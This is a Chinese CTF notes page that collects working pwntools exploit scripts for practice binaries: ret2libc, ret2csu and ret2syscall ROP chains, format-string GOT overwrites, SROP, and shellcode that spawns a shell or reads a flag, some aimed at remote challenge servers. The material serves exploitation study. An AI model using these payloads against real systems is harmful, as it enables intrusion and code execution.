---
title: pwn-exp记录
date: 2024-2-4
tags:
  - CTF
  - PWN
---
~~~
# 1 <dofunc> rbp  0x7ffc90810070 —▸ 0x7ffc90810080 ◂— 1
# 2 <dofunc> rbp  0x7ffc9080ff60 —▸ 0x7ffc9080ff70 —▸ 0x7fd8bc7172c0 ◂— 0
~~~

~~~python
print(hex(elf.symbols['puts'])) # 0x10d4 —▸ puts@plt
print(hex(elf.sym['puts']))     # 0x10d4 —▸ puts@plt
print(hex(elf.plt['puts']))     # 0x10d4 —▸ puts@plt
print(hex(elf.got['puts']))     # 0x3f90 —▸ puts@GLIBC

.plt
0x10d4    puts@plt

.got
0x3f90    puts@GLIBC
~~~

**ret2shellcode**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./question_6_1_x64"
elf = ELF(pwnfile)
io = process(pwnfile)

delim = b'input:\n'
sh = shellcraft.sh() # class_string 汇编指令字符串
payload = asm(sh) # 将汇编指令汇编成机器码
io.sendafter(delim, payload)

io.interactive()
~~~

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./question_6_3_x64"
elf = ELF(pwnfile)
io = process(pwnfile)

# gdb.attach(io, "set context-output /dev/pts/6")

delim = b'input:\n'
sh = shellcraft.sh() # class_string 汇编指令字符串
padding = cyclic(0x110 + 8 - len(asm(sh))) # $rbp - $rsi = 0x110
ret = elf.symbols['buf2']
payload = flat([asm(sh), padding, ret])
io.sendafter(delim, payload)

io.interactive()
~~~

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)
libc = elf.libc
io = process(pwnfile) 
# io = remote("10.1.178.37", 9999)

script = """set context-output /dev/pts/4"""
gdb.attach(io,script)
pause()

exit_got = elf.got['exit']

# 共 0x15 个字节,算上xor rdx, rdx共 0x18 个字节
sh = """
mov rax, 0x68732f6e69622f
push rax
push rsp
pop rdi
xor rsi, rsi
//xor rdx, rdx 原题rdx已经是0了,省了3个字节
push 0x3b
pop rax
syscall
"""

payload1 = asm(sh)
io.send(payload1)
pause()

sh_addr = 0x405000
num = sh_addr & 0xffff
payload2 = flat([num, exit_got, 2])
print("[*] exit@got:", hex(exit_got))
io.send(payload2)

io.interactive()

~~~



**re2libc**

在x86的情况下，直接通过栈传参泄露地址

~~~python
from pwn import *

context.log_level = "debug"
context.arch = "i386"
context.os = "linux"

libc = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc)
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b"/bin/sh"))

target = "./question_5_x86"
proc = process(target)
target = ELF(target)

write_got = target.got['write'] # write@got这个内存单元在内存中的地址

padding = cyclic(0x14)
write_plt = target.symbols['write'] # write@plt这个函数在内存中的地址
ret = target.symbols['dofunc'] # dofunc这个函数在内存中的地址
arg1 = 1
arg2 = write_got
arg3 = 4
payload = flat([padding, write_plt, ret, arg1, arg2, arg3])

# gdb.attach(proc)
# pause()

delim = "input:"
proc.sendlineafter(delim, payload)
proc.recvuntil(b"byebye")
write_libc = u32(proc.recv(4))
libc_base = write_libc - write_offset
system_libc = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
print("<libc_base>:", hex(libc_base))
print("<write@libc>:", hex(write_libc))
print("<system@libc>:", hex(system_libc))
print("</bin/sh>:", hex(bin_sh_addr))

payload2 = flat([padding, system_libc, 0xdeadbeef, bin_sh_addr])
proc.sendlineafter(delim, payload2)
proc.interactive()
~~~

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)
libc = elf.libc
# io = process(pwnfile)
io = remote("47.97.58.52", 42003)

script = """set context-output /dev/pts/5"""
# gdb.attach(io, script)
# pause()
io.recvline()
puts_got  = elf.got['puts']
vuln_addr = elf.symbols['vuln']
padding = cyclic(0x28)
pop_rdi_ret = 0x4012c3
rdi = puts_got
call_puts = 0x401218 # call puts
puts_addr = elf.plt['puts']
payload = flat([padding, pop_rdi_ret, rdi, puts_addr, vuln_addr])
io.send(payload)
puts_libc = u64(io.recv()[0:6].ljust(8, b'\x00'))
libc_base = puts_libc - libc.symbols['puts']
system_libc = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))

io.recvline()

print("<puts@libc>:", hex(puts_libc))
print("<libc_base>:", hex(libc_base))
print("<system_libc>:", hex(system_libc))
print("</bin/sh>:", hex(bin_sh_addr))

rdi = bin_sh_addr
ret = 0x40101a
payload = flat([padding, ret, pop_rdi_ret, rdi, system_libc])
io.send(payload)

io.interactive()
~~~



**ret2csu**

~~~python
from pwn import *
from ctypes import *
context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)

io = remote("47.97.58.52", 40005)
# io = process(pwnfile)
# gdb.attach(io)
# pause()
print(io.recvline())
print(io.recvline())

bin_sh = b"/bin/sh\x00" + p64(0x40126D)
bin_sh_addr = 0x404090
io.send(bin_sh)
print(io.recvline())
print(io.recvline())
padding = cyclic(15) + b'\x00' + cyclic(8)
csu1 = 0x4013A0
csu2 = 0x4013BA
rbx = 0
rbp = 1
r12 = bin_sh_addr
r13 = 0
r14 = 0
r15 = 0x404098
payload = flat([padding, csu2, rbx, rbp, r12, r13, r14, r15, csu1])
io.send(payload)
print(io.recv())
io.interactive()
~~~





在amd64情况下，通过`gadegt`无法很好的控制rdi，所以用**ret2csu**来传参调用write泄露地址

exp分两部分，第一部分泄露地址，第二部分调用system

~~~python
from pwn import *

context(log_level="debug", arch="amd64", os="linux")

libc = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(libc)
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b'/bin/sh'))

target = "./question_5_x64"
proc = process(target)
target = ELF(target)

write_got = target.got['write']

padding = cyclic(0x10)
ret2csu = target.symbols['__libc_csu_init'] + 0x52 # constructor support unit
rbx = 0
rbp = 1
r12 = 1
r13 = write_got
r14 = 8
r15 = write_got
retn = 0x4011D8
ret2dofunc = target.symbols['dofunc']

# gdb.attach(proc)

payload = flat([padding, ret2csu, rbx, rbp, r12, r13, r14, r15, retn])
payload += p64(0xdeadbeef) * 7 + p64(ret2dofunc)
delim = "input:"
proc.sendlineafter(delim, payload)
proc.recvuntil(b"byebye")
write_libc = u64(proc.recv(8))
libc_base = write_libc - write_offset
system_libc = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset
print("<write@libc>:", hex(write_libc))
print("<libc_base>:", hex(libc_base))
print("<system@libc>:", hex(system_libc))
print("</bin/sh>:", hex(bin_sh))


ret1 = 0x4011fb
rdi = bin_sh
ret2 = 0x401016 # 因为glibc >= 2.27 所以需要多pop一下rsp
ret = system_libc
payload = flat([padding, ret1, rdi, ret2, ret])

proc.sendlineafter(delim, payload)
# pause()
proc.interactive()
~~~

**ret2syscall**

系统调用号在`/usr/include/asm/unistd_[32/64].h`中，或者`/usr/include/x86_64-linux-gnu/asm/unistd_[32/64].h`

**syscall** 也会记录下一条指令的地址然后直接返回到下一条指令（保存 `rip`

x64

~~~python
from pwn import *

context(log_level="debug", arch="amd64", os="linux")

target = "./question_5_x64_static"
io = process(target)
target = ELF(target)


NR_read = 0
NR_execve = 0x3b
bin_sh = 0x4AF648

syscall = 0x40E56C

padding = cyclic(0x10)
pop_rax_ret = 0x43efc3
rax = NR_read
pop_rdi_ret = 0x401741
rdi = 0
pop_rsi_ret = 0x407b1e
rsi = bin_sh
pop_rdx_ret = 0x40168b
rdx = 8
payload1 = flat([padding, pop_rax_ret, rax, pop_rdi_ret, rdi, pop_rsi_ret, rsi, pop_rdx_ret, rdx, syscall])

rax = NR_execve
rdi = bin_sh
rsi = 0
rdx = 0
payload2 = flat([pop_rax_ret, rax, pop_rdi_ret, rdi, pop_rsi_ret, rsi, pop_rdx_ret, rdx, syscall])

payload = payload1 + payload2

delim = "input:"
io.sendlineafter(delim, payload)
io.send(b'/bin/sh\x00')
io.interactive()
~~~

x86

~~~python
from pwn import *
context(log_level='debug', arch='i386', os='linux')

target = "./question_5_static_x86"
io = process(target)
target = ELF(target)

NR_read = 3
NR_execve = 11
bin_sh = 0x80E6044
int_80h_ret = 0x8071FE0

# gdb.attach(io)
# pause()

padding = cyclic(0x14)
pop_eax_ret = 0x080ae706
eax = NR_read
pop_ebx_ret = 0x0804901e
ebx = 0
ecx = bin_sh
mov_ecx_eax_ret = 0x080929b0
pop_edx_ret = 0x08069ca8
edx = 8

payload1 = flat([padding, pop_eax_ret, ecx, mov_ecx_eax_ret, pop_eax_ret, eax, pop_ebx_ret, ebx, pop_edx_ret, edx, int_80h_ret])

eax = NR_execve
ebx = bin_sh
ecx = 0
edx = 0
payload2 = flat([pop_eax_ret, ecx, mov_ecx_eax_ret, pop_eax_ret, eax, pop_ebx_ret, ebx, pop_edx_ret, edx, int_80h_ret])

payload = payload1 + payload2

delim = "input:"
io.sendlineafter(delim, payload)
io.send(b'/bin/sh\x00')
io.interactive()
~~~

**栈上fmtstr**

~~~python
from pwn import *
DEBUG = True

context(log_level="debug", arch="i386", os="linux")

pwnfile = "./fmt_str_level_1_x86"

elf = ELF(pwnfile)
libc = elf.libc

io = process(pwnfile)

if DEBUG:
    gdb.attach(io)
    pause()

io.recvline()

delim = b"input:\n"

payload1 = b"%75$p\x00" # to get <main+30> address
io.send(payload1)
main_30 = int(io.recvuntil(delim, True)[2:], 16) # <main+30>
main_addr = main_30 - 30 # <main>
print("<main>:", hex(main_addr))
offset = elf.got['puts'] - elf.symbols['main']
puts_got = main_addr + offset
print("<puts@got>:", hex(puts_got))

payload2 = flat([puts_got, "%7$s\x00"]) # to get <puts@libc> address from <puts@got>
io.send(payload2)
io.recv(4)
puts_addr = u32(io.recv(4))
print("<puts@libc>:", hex(puts_addr))
offset = libc.symbols['puts']
libc_base = puts_addr - offset
print("<libc_base>:", hex(libc_base))
io.recv()

system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
print("<system@libc>:", hex(system_addr))
print("</bin/sh>:", hex(bin_sh))

offset = elf.got['printf'] - elf.symbols['main']
printf_got = main_addr + offset
print("<printf@got>:", hex(printf_got))
payload = fmtstr_payload(7, {printf_got: system_addr})
print("payload:", payload)
io.send(payload)

io.interactive()
if DEBUG:
    pause()
~~~

~~~python
from pwn import *
DEBUG = False

context(log_level="debug", arch="amd64", os="linux")

pwnfile = "./fmt_str_level_1_x64"

elf = ELF(pwnfile)
libc = elf.libc

io = process(pwnfile)

if DEBUG:
    gdb.attach(io)
    pause()

io.recvline()

delim = b"input:\n"

payload1 = b"%41$p\x00" # to get <main+28> address
io.send(payload1)
main_28 = int(io.recvuntil(delim, True)[2:], 16) # <main+28>
main_addr = main_28 - 28 # <main>
print("<main>:", hex(main_addr))
offset = elf.got['puts'] - elf.symbols['main']
puts_got = main_addr + offset
print("<puts@got>:", hex(puts_got))

payload2 = flat(["%7$s", "aaaa", puts_got, "\x00"]) # to get <puts@libc> address from <puts@got>
io.send(payload2)
puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
print("<puts@libc>:", hex(puts_addr))
offset = libc.symbols['puts']
libc_base = puts_addr - offset
print("<libc_base>:", hex(libc_base))
io.recv()

system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
print("<system@libc>:", hex(system_addr))
print("</bin/sh>:", hex(bin_sh))

offset = elf.got['printf'] - elf.symbols['main']
printf_got = main_addr + offset
print("<printf@got>:", hex(printf_got))
payload = fmtstr_payload(6, {printf_got: system_addr}) # offset 是输入地址对printf()来说是$几参数
print("payload:", payload)
io.send(payload)

io.interactive()
if DEBUG:
    pause()
~~~

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

io = process('./pwn')
# io = remote("27.25.151.29",34277)
elf = ELF('./pwn')
libc = elf.libc

# gdb.attach(io,"set context-output /dev/pts/6")
# pause()

printf_got = elf.got['printf']

delim = b"data: \n"
payload1 = b"%19$p\x00"
io.sendafter(delim, payload1)
ibc_start_main = int(io.recv(14), 16) + 0x30
libc_base = ibc_start_main - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']

low = system_addr & 0xff
high = (system_addr >> 8) & 0xffff
payload = b'%' + str(low).encode() + b'c%12$hhn' # 改1个字节
payload += b'%' + str(0x10000 + high - low).encode() + b'c%13$hn' # 改2个字节
# 一般是后面3个字节不同，前面3个字节都是一样的
# printf@libc: 0x7f0bc02606f0 <printf>
# system@libc: 0x7f0bc0250d70 <system>
payload = payload.ljust(0x20, b'a')
payload += p64(elf.got['printf']) + p64(elf.got['printf']+1)
io.sendafter(delim, payload)

io.sendafter(delim, b"/bin/sh\x00")

io.interactive()
~~~



**buf是全局变量的fmtstr，栈的特点是素质三连 addr1(esp,ebp) -> addr2 -> addr3**

~~~python
from pwn import *
DEBUG = True

context(log_level="debug", arch="amd64", os="linux")

pwnfile = "./fmt_str_level_2_x64"
io = process(pwnfile)

elf = ELF(pwnfile)
libc = elf.libc


delim = b"hello\n"
io.recvline()

payload1 = b"%13$p\x00"
io.send(payload1)
main_addr = int(io.recv(), 16)
process_base = main_addr - elf.symbols['main']
printf_got = process_base + elf.got['printf']
print("<main>:\t\t", hex(main_addr))
print("<base>:\t", hex(process_base))
print("<printf@got>:\t", hex(printf_got))

payload2 = b"%31$p\x00"
io.send(payload2)
libc_start_main_133 = int(io.recv(), 16)
libc_base = libc_start_main_133 - 133 - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
print("<__libc_start_main+133>:\t", libc_start_main_133)
print("<libc_base>:\t", hex(libc_base))
print("<system@libc:\t", hex(system_addr))

payload3 = b"%6$p\x00"
io.send(payload3)
play_rbp = int(io.recv(), 16)
print("<rbp@play>:\t", hex(play_rbp))
addr1 = play_rbp - 0x8
addr2 = play_rbp + 0x8
addr3 = play_rbp + 0x28

addrs = [addr1, addr2, addr3]

for i in range(3):
    payload4 = b"%" + str(addrs[i] & 0xffff).encode() + b"c%6$hn\x00"
    io.send(payload4)
    io.interactive() # 远端printf输出太长了,缓冲区需要分批发出,本地的recv()一次不够用,换interactive()持续接收,用ctrl+c退出让exp脚本继续进行下一步了
    payload5 = b"%" + str((printf_got + i * 2) & 0xffff).encode() + b"c%8$hn\x00"
    io.send(payload5)
    io.interactive()

system_addr_1 = system_addr & 0xffff
system_addr_2 = (system_addr >> 16) & 0xffff
system_addr_3 = (system_addr >> 32) & 0xffff

payload = b"%" + str(system_addr_1).encode() + b"c" + b"%7$hn"
payload += b"%" + str(0x10000 - system_addr_1 + system_addr_2).encode() + b"c" + b"%9$hn"
payload += b"%" + str(0x10000 - system_addr_2 + system_addr_3).encode() + b"c" + b"%13$hn"
io.send(payload)
io.interactive()
io.send(b"/bin/sh\x00")
 
print("<main>:\t\t", hex(main_addr))
print("<base>:\t", hex(process_base))
print("<printf@got>:\t", hex(printf_got))
print("<rbp@play>:\t", hex(play_rbp))
print("<__libc_start_main+133>:\t", hex(libc_start_main_133))
print("<libc_base>:\t", hex(libc_base))
print("<system@libc:\t", hex(system_addr))

if DEBUG:
    gdb.attach(io)
    pause()

if DEBUG:
    io.interactive()
~~~

**x86 只输入一次字符串 关闭PIE 修改fini_entry**

~~~python
from pwn import *
DEBUG = False

context(log_level="debug", arch="i386", os="linux")

pwnfile = "./fmt_str_once_x86"

elf = ELF(pwnfile)
libc = elf.libc

print(hex(elf.symbols['printf'])) # printf@plt
print(hex(elf.got['printf'])) # printf@got

io = process(pwnfile)


io.recvline()

main_addr = elf.symbols['main']
fini_entry_addr = 0x804B234
printf_got = elf.got['printf']
system_plt = elf.symbols['system']

payload = fmtstr_payload(7, {fini_entry_addr: main_addr, printf_got: system_plt})
io.send(payload)

if DEBUG:
    gdb.attach(io)
    pause()

io.interactive()
~~~

**fmtstr只输入一次，但是payload太长只能使用one_gadget**

~~~python
from pwn import *
DEBUG = False
context(log_level="debug", arch="amd64", os="linux")

#1. 泄露libc基地址,泄露栈地址,修改fini_entry为main地址
#2. 修改栈实现ROP
# 分两步走,第一步:泄露, 第二步:攻击
pwnfile = "./fmt_str_once_sys_x64_nopie"

elf = ELF(pwnfile)
libc = elf.libc

io = process(pwnfile)

if DEBUG:
    gdb.attach(io)
    pause()

delim = b"input:\n"
io.recvline()

main_addr = elf.symbols['main']
puts_got = elf.got['puts']
printf_got = elf.got['printf']
fini_entry = 0x4031D0

# 控制 _exit() 返回到 main()
payload1 = b"%40$p%16$s".ljust(16, b'a') # 同时泄露rbp和基地址
numbwritten = 14 + 6 + 6 # len(%40$p) + len(%16$s) + len('a'*6)
payload2 = fmtstr_payload(8, {fini_entry: main_addr}, numbwritten)
payload3 = p64(puts_got)
payload = flat([payload1, payload2, payload3])
io.send(payload) # 泄露

main_rbp_1 = int(io.recv(14), 16)
dofunc_rbp_1 = main_rbp_1 - 0x10
dofunc_rbp_2 = main_rbp_1 - 0xf0

puts_libc = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = puts_libc - libc.symbols['puts']
system_libc = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
print("#1 <rbp@main>:", hex(main_rbp_1))
print("#1 <rbp@dofunc>:", hex(dofunc_rbp_1))
print("#2 <rbp@dofunc>:", hex(dofunc_rbp_2))
print("<libc_base>:", hex(libc_base))
print("<system_base>:", hex(system_libc))
print("</bin/sh>:", hex(bin_sh_addr))
# ------------------------------分界线----------------------------------#
rbp = dofunc_rbp_2
ret = rbp + 0x8
pop_rdi_ret = 0x401363
# 这种方式发出去的字节太长了,超出了read()的范围
# writes = {ret: pop_rdi_ret, rbp+0x10: bin_sh_addr, rbp+0x18: system_libc}
# payload = fmtstr_payload(6, writes)
one_gadget = libc_base + 0xe6aee # execve("/bin/sh", r15, r12)
print("<one_gadget>:", hex(one_gadget))
payload = fmtstr_payload(6, {ret: one_gadget}) # 用 one_gadegt打
io.sendafter(delim, payload) # 攻击

io.interactive()

# 1 <dofunc> RBP  0x7ffc67436120 —▸ 0x7ffc67436130 ◂— 0
# 2 <dofunc> RBP  0x7ffc67436040 —▸ 0x7ffc67436050 —▸ 0x7ffc674360d0 ◂— 0

# one_gadget /lib/x86_64-linux-gnu/libc.so.6
# 0x4d74c posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rax == NULL || {"sh", rax, rip+0x14a6c3, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0x4d753 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, rip+0x14a6c3, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0xd636b execve("/bin/sh", rbp-0x40, r13)
# constraints:
#   address rbp-0x38 is writable
#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
#   [r13] == NULL || r13 == NULL || r13 is a valid envp

~~~

**随机数绕过**

~~~python
from pwn import *
from ctypes import *
context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./test"
elf = ELF(pwnfile)
libc = cdll.LoadLibrary("./libc.so.6")

io = remote("47.97.58.52", 40003)
# io = process(pwnfile)
seed = libc.time(0)
libc.srand(seed)
num = libc.rand() % 100
# gdb.attach(io)
# pause()
print(num)
flag_fd = 2 + num + 1
io.recv()
io.recvline()
io.recvline()
io.sendline(b"0")
io.sendline(str(flag_fd).encode())
io.sendline(b"1")
io.sendline(b"1")


io.interactive()
~~~



**stack smashing，仅限 libc_2.23**

栈上的某个位置保存着指向文件名字符串的指针，程序会从这个栈格子上获取文件名字符串的地址。

`search /mnt/hgfs`找到文件名字符串的地址，`search -p 0x7fffffffe4ea`查找栈上哪个地址存储了文件名字符串的地址

~~~assembly
RDX  0x7fffffffe088[stack] —▸ 0x7fffffffe4ea ◂— '/mnt/hgfs/Shared/stack_smash_libc2_23_x64'

   0x7ffff787764e    mov    rcx, qword ptr [rdx]            RCX, [0x7fffffffe088] => 0x7fffffffe4ea ◂— '/mnt/hgfs/Shared/stack_smash_libc2_23_x64'
   0x7ffff7877651    add    rbx, 2                          RBX => 0x7ffff798f5ad (0x7ffff798f5ab + 0x2)
   0x7ffff7877655    mov    rdi, rcx                        RDI => 0x7fffffffe4ea ◂— '/mnt/hgfs/Shared/stack_smash_libc2_23_x64'
 ► 0x7ffff7877658    mov    qword ptr [rbp - 0x90], rcx     [0x7fffffffe040] => 0x7fffffffe4ea ◂— '/mnt/hgfs/Shared/stack_smash_libc2_23_x64'
   0x7ffff787765f    call   strlen                      <strlen>
~~~

~~~python
from pwn import *
context(log_level='debug',arch='amd64', os='linux')
pwnfile= './stack_smash_libc2_23_x64'
io = process(pwnfile)
elf = ELF(pwnfile)
 
buf_flag = elf.symbols["buf_flag"]
puts_got = elf.got["puts"]
padding = cyclic(0x108)
payload = padding + p64(buf_flag)
delim = 'input:'
io.sendlineafter(delim, payload)
io.interactive()
~~~

**SROP**

~~~assembly
public start
start proc near
xor     rax, rax
mov     edx, 400h
mov     rsi, rsp
mov     rdi, rax
syscall
retn
start endp
~~~

~~~assembly
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA─────────────────────────────────
────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────
 RAX  0
 RDX  0x400
 RDI  0
 RSI  0x7ffcefb227d8 —▸ 0x401000 (_start) ◂— xor rax, rax
 RSP  0x7ffcefb227d8 —▸ 0x401000 (_start) ◂— xor rax, rax
*RIP  0x40100e (_start+14) ◂— syscall
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────
   0x401000 <_start>       xor    rax, rax         RAX => 0
   0x401003 <_start+3>     mov    edx, 0x400       EDX => 0x400
   0x401008 <_start+8>     mov    rsi, rsp         RSI => 0x7ffdec2f5348 —▸ 0x401000 (_start) ◂— xor rax, rax
   0x40100b <_start+11>    mov    rdi, rax         RDI => 0
 ► 0x40100e <_start+14>    syscall  <SYS_read>
        fd: 0 (pipe:[305198])
        buf: 0x7ffcefb227d8[RSP] —▸ 0x401000 (_start) ◂— xor rax, rax
        nbytes: 0x400
   0x401010 <_start+16>    ret                                <_start>
     ↓
   0x401008 <_start+8>     mov    rsi, rsp          RSI => 0x7ffcefb227e0 —▸ 0x401000 (_start) ◂— xor rax, rax
   0x40100b <_start+11>    mov    rdi, rax          RDI => 1
   0x40100e <_start+14>    syscall
   0x401010 <_start+16>    ret                                <_start+8>
    ↓
───────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsi rsp ret 0x7ffcefb227d8 —▸ 0x401000 (_start) ◂— xor rax, rax
01:0008│             0x7ffcefb227e0 —▸ 0xdeadbeef
02:0010│             0x7ffcefb227e8 —▸ 0x7ffcefb242d5 ◂— 'COLORFGBG=15;0'
03:0018│             0x7ffcefb227f0 —▸ 0x7ffcefb242e4 ◂— 'COLORTERM=truecolor'
04:0020│             0x7ffcefb227f8 —▸ 0x7ffcefb242f8 ◂— 'COMMAND_NOT_FOUND_INSTALL_PROMPT=1'
05:0028│             0x7ffcefb22800 —▸ 0x7ffcefb2431b ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus'
06:0030│             0x7ffcefb22808 —▸ 0x7ffcefb24351 ◂— 'DESKTOP_SESSION=lightdm-xsession'
07:0038│             0x7ffcefb22810 —▸ 0x7ffcefb24372 ◂— 'DISPLAY=:0.0'
~~~

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./SROP_1_x64"
elf = ELF(pwnfile)
start_addr = elf.symbols['_start']
syscall_addr = start_addr + 0x0e

io = process(pwnfile)
gdb.attach(io, "set context-output /dev/pts/6")
pause()

payload = p64(start_addr) * 3
io.send(payload)
io.send(p8(0x08))
io.recv(8)
stack_addr = u64(io.recv(8).ljust(8, b'\x00'))
print(hex(stack_addr))

#-------------------------------------------------------------------------#
# read(0, stack_addr, 0x400) rax=0 rdi=0 rsi=stackaddr rdx=0x400
sigframe = SigreturnFrame() 
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_addr

# payload = p64(start_addr)  + p64(0xdeadbeef)
# payload += bytes(sigframe)
payload = flat([start_addr, 0xdeadbeef, bytes(sigframe)]) # 0xdeadbeef会被后面的syscall_addr覆盖
io.send(payload)
pause()

# constants.SYS_rt_sigreturn = 15
padding = cyclic(constants.SYS_rt_sigreturn - len(p64(syscall_addr)))
io.send(flat([syscall_addr, padding])) # 通过 SYS_read 返回 syscall 启动 SYS_rt_sigreturn(15)
pause()
#-------------------------------------------------------------------------#
bin_sh_offset = 0x120
bin_sh_addr = stack_addr + bin_sh_offset
# execve("/bin/sh", NULL, NULL) rax=0x3b rdi="/bin/sh" rsi=0 rdx=0
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = bin_sh_addr
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = stack_addr
sigframe.rip = syscall_addr

payload = p64(start_addr) + p64(0xdeadbeef)
payload += bytes(sigframe)
payload += cyclic(bin_sh_offset - len(payload)) + b"/bin/sh\x00"
io.send(payload)
pause()

padding = cyclic(constants.SYS_rt_sigreturn - len(p64(syscall_addr)))
io.send(flat([syscall_addr, padding])) # 通过 SYS_read 返回 syscall 启动 SYS_rt_sigreturn(15)
#--------------------------------------------------------------------------#
io.interactive()
~~~

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)


io = process(pwnfile)
# gdb.attach(io, """set context-output /dev/pts/5
# b *0x401060""")
# pause()
io = remote("47.97.58.52", 42011)
delim = b'Hello> '

call_read = 0x401040
syscall_addr = 0x40104E

stack_addr = 0x402000

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = 0x402000
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_addr

padding = cyclic(15) + b'\x00' + cyclic(0x50 - 16)

payload1 = flat([padding, syscall_addr, bytes(sigframe)])
io.sendafter(delim, payload1)
pause()
#---------------------------------------------------------------------------#
bin_sh = b'/bin/sh\x00'
bin_sh_offset = 16
bin_sh_addr = stack_addr + bin_sh_offset

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = bin_sh_addr
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = 0x402000
sigframe.rip = syscall_addr

padding = cyclic(15) + b'\x00' + bin_sh + cyclic(0x50 - 16 - len(bin_sh))
payload2 = flat([padding, syscall_addr, bytes(sigframe)])
io.send(payload2)
io.interactive()
~~~

**ORW + nop**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)


io = process(pwnfile)
# gdb.attach(io, "set context-output /dev/pts/5")
# pause()
delim = b'Show me what you want to run: '

# open("/flag", 2)
# read(3, buf, 0x400)
# write(1, buf, 0x400)
sh = """mov rax, 0x67616c662f
    push rax
    mov rax, 2
    mov rdi, rsp
    mov rsi, 2
    syscall 
    mov rax, 0
    mov rdi, 3
    mov rsi, 0x20240000
    mov rdx, 0x400
    syscall 
    push rax
    mov rdx, 0x400
    mov rsi, 0x20240000
    mov rdi, 1
    mov rax, 1
    syscall """ 
padding = b'\x90' * 150 # rand() % 256
payload = padding + asm(sh)
while True:
    io = remote("47.97.58.52", 42013)
    io.sendafter(delim, payload)
    io.interactive()
~~~

**fmtstr_四马分肥**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)


io = process(pwnfile)
# gdb.attach(io, "set context-output /dev/pts/5")
# pause()


delim = b"Say something:"
payload1 = b"%9$p\x00"
io.sendafter(delim, payload1)
io.recvline()
io.recvline()
start_addr = int(io.recv()[0:14], 16)
key_addr = start_addr + (elf.symbols['key'] - elf.symbols['_start'])
print("key_addr:", hex(key_addr))

key = 0x1919810
key_num1 = key & 0xff
key_num2 = (key >> 8) & 0xff
key_num3 = (key >> 16) & 0xff
key_num4 = 0

payload2 = b"%16c%8$hhn".ljust(16, b'a') + p64(key_addr)
io.send(payload2)
io.recvline()
io.recvline()

payload2 = b"%152c%8$hhn".ljust(16, b'a') + p64(key_addr + 1)
io.sendafter(delim, payload2)
io.recvline()
io.recvline()

payload2 = b"%145c%8$hhn".ljust(16, b'a') + p64(key_addr + 2)
io.sendafter(delim, payload2)
io.recvline()
io.recvline()

payload2 = b"%1c%8$hhn".ljust(16, b'a') + p64(key_addr + 3)
io.sendafter(delim, payload2)
io.recvline()
io.recvline()

payload3 = b"stop\x00"
io.sendafter(delim, payload3)
io.recv()

io.send(asm(shellcraft.sh()))
io.interactive()
~~~

**buf不在栈上的fmtstr + shellcode + ORW**

~~~python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = "./pwn"
elf = ELF(pwnfile)
libc = elf.libc
io = process(pwnfile)
io = remote("47.97.58.52", 43000)

script = """set context-output /dev/pts/5"""
# gdb.attach(io, script)
# pause()

delim = b"Say something:"

payload1 = b"%7$p\x00" # 泄露 proc 地址
io.sendafter(delim, payload1)
io.recvuntil(b'0x')
main_80 = int(io.recvline()[:12], 16)
main_addr = main_80 - 80
proc_base = main_addr - elf.symbols['main']
